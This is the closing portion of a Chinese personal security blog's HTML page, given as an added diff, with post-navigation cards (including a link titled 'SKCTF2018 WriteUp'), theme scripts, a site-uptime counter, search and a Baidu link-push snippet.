+                            <i class="far fa-clock fa-fw icon-date"></i>2018-07-28
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/note/" class="post-category">
+                                    note
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/note/">
+                        <span class="chip bg-color">note</span>
+                    </a>
+                    
+                    <a href="/tags/%E5%8A%A0%E8%A7%A3%E5%AF%86/">
+                        <span class="chip bg-color">加解密</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2018/05/07/skctf2018-writeup/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/blog-theme-pic/coverimgs/1.jpg" class="responsive-img" alt="SKCTF2018 WriteUp">
+                        
+                        <span class="card-title">SKCTF2018 WriteUp</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+
+SKCTF2018 WriteUp
+山东科技大学网络安全小组
+
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2018-05-07
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            LANVNAL
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/WriteUp/">
+                        <span class="chip bg-color">WriteUp</span>
+                    </a>
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2017</span>
+            <a href="/about" target="_blank">LANVNAL</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">120.6k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2017";
+                    var startMonth = "3";
+                    var startDate = "15";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/LANVNAL" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:lanvnal@foxmail.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+    <script src="/libs/instantpage/instantpage.js" type="module"></script>
+    
+
+</body>
+
+</html>
